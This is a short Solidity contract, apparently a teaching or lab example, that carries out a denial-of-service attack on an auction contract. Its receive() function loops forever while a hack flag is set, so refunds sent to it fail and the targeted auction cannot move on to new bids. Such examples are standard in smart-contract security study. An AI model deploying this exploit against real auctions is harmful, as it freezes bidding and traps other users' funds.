// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./DosAuction.sol";

contract DosAttacker {
    DosAuction private auction;
    bool private hack = true;
    address payable private owner;

    constructor(address _auction) {
        auction = DosAuction(_auction);
        owner = payable(msg.sender);
    }

    function bid() external payable {
        auction.bid{value: msg.value}();
    }

    function toggleHack() external {
        require(msg.sender == owner, "failed");

        hack = !hack;
    }

    receive() external payable {
        if(hack == true) {
            while(true) {}
        } else {
            owner.transfer(msg.value);
        }
    }
}
